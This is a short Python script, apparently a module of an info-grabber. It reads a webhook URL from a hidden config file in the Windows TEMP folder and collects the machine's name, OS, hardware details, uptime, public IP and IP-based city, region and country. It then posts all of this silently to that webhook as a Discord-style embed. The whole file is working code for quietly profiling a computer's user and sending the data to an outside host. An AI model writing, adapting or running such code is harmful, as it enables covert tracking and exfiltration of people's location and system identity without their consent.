import os
import wmi
import psutil
import requests
import geocoder
import socket
import platform
import time

webhook_path = os.path.join(os.getenv('TEMP'), 'config', 'webhook.txt')

try:
    with open(webhook_path, 'r') as file:
        webhook_url = file.read().strip()
except FileNotFoundError:
    exit()

c = wmi.WMI()

computer_info = c.Win32_ComputerSystem()[0]
os_info = c.Win32_OperatingSystem()[0]
bios_info = c.Win32_BIOS()[0]
processor_info = c.Win32_Processor()[0]
disk_info = c.Win32_DiskDrive()[0]
network_info = c.Win32_NetworkAdapter()[0]
video_info = c.Win32_VideoController()[0]

# Vérifier si des informations sur la mémoire physique sont disponibles
memory_info = None
try:
    memory_info = c.Win32_PhysicalMemory()[0]
except IndexError:
    memory_info = None

# Si les informations sont disponibles, récupérer la capacité de la RAM
if memory_info:
    ram_capacity = f"{round(int(memory_info.Capacity) / (1024**3))} Go"
else:
    ram_capacity = "Inconnu"

local_ip = socket.gethostbyname(socket.gethostname())

public_ip = requests.get('https://api.ipify.org').text
location = geocoder.ip(public_ip)

architecture = platform.architecture()[0]

uptime_seconds = time.time() - psutil.boot_time()
uptime = str(time.strftime("%H:%M:%S", time.gmtime(uptime_seconds)))

uefi_mode = os.path.exists(r"C:\Windows\System32\efisys.bin")

embed = {
    "username": "🖥️ Informations Système",
    "embeds": [
        {
            "title": "Informations Système",
            "color": 65280,
            "thumbnail": {
                "url": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Windows_logo_2021.svg/1200px-Windows_logo_2021.svg.png"
            },
            "fields": [
                {"name": "📍 Adresse IP", "value": public_ip, "inline": True},
                {"name": "🌍 Ville", "value": location.city if location.city else 'Inconnue', "inline": True},
                {"name": "🗺️ Région", "value": location.raw.get('region', 'Inconnue'), "inline": True},  
                {"name": "🌎 Pays", "value": location.country if location.country else 'Inconnue', "inline": True},
                {"name": "💻 Nom de l'ordinateur", "value": computer_info.Name, "inline": True},
                {"name": "🖥️ Système", "value": os_info.Caption, "inline": True},
                {"name": "💾 RAM", "value": ram_capacity, "inline": True},
                {"name": "💾 Stockage disque", "value": f"{round(int(disk_info.Size) / (1024**3))} Go", "inline": True},
                {"name": "🖥️ OS", "value": f"Windows {os_info.Version}", "inline": True},
                {"name": "⏳ Durée depuis démarrage", "value": uptime, "inline": True},
                {"name": "🔐 Firmware", "value": "⚡ UEFI" if uefi_mode else "🖥️ BIOS", "inline": True}
            ]
        }
    ]
}

requests.post(webhook_url, json=embed)
